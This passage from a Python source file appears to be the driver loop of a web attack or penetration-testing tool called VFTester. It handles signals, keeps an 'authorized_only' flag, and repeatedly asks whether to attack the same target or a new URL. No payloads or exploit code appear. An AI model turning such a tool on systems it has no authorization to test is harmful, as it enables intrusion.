                tester._session_mgr.ssl_ctx = tester._ssl_ctx  # sync with SessionManager

            # S6: Store authorized-only flag
            tester._authorized_only = args.authorized_only

            _current_tester = tester

            # BUG-FIX: Register signal handlers via loop.add_signal_handler()
            # This is the asyncio-safe way to handle signals — the callback runs
            # on the event loop thread, not in the signal handler context.
            if not IS_WINDOWS:
                loop = asyncio.get_running_loop()
                _handler = _make_signal_handler(loop)
                try:
                    loop.add_signal_handler(signal.SIGINT, _handler)
                    loop.add_signal_handler(signal.SIGTERM, _handler)
                except (OSError, ValueError, RuntimeError):
                    pass  # Can't set signal handler in non-main thread or no loop

            # v27: Attack loop — ask user after each run if they want to continue
            while True:
                await tester.run()

                # Ask user if they want to attack again (with a new target or same)
                print()
                print(f"  {C.BD}{T('accent')}[?]{C.RS} {C.W}Attack again? {C.BD}[r]=same target  [n]=new URL  [q]=quit{C.RS} ", end="", flush=True)
                try:
                    answer = input().strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                if answer in ("q", "quit", "exit", "خروج"):
                    logger.info(f"\n  [EXIT] Goodbye.\n")
                    break
                elif answer in ("n", "new", "جدید"):
                    print(f"  {C.W}Enter new target URL: {C.RS}", end="", flush=True)
                    try:
                        new_url = input().strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        break
                    if not new_url:
                        logger.info(f"[EXIT] No URL provided. Goodbye.\n")
                        break
                    # Auto-add https://
                    if not new_url.startswith(("http://", "https://")):
                        new_url = "https://" + new_url
                    tester = VFTester(target_url=new_url)
                    if args.max_workers:
                        tester.max_workers = args.max_workers
                    _current_tester = tester
                elif answer in ("r", "repeat", "retry", "دوباره"):
                    # Re-run with same target — state reset now handled in run()
                    pass
                else:
                    logger.info(f"\n  [EXIT] Goodbye.\n")
                    break

        asyncio.run(_run())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    except asyncio.CancelledError:
        logger.debug("Tasks cancelled during shutdown")
    except SystemExit:
        raise
    except (RuntimeError, OSError, ValueError, AttributeError, ConnectionError) as exc:
        logger.error(f"Unexpected error: {exc}")
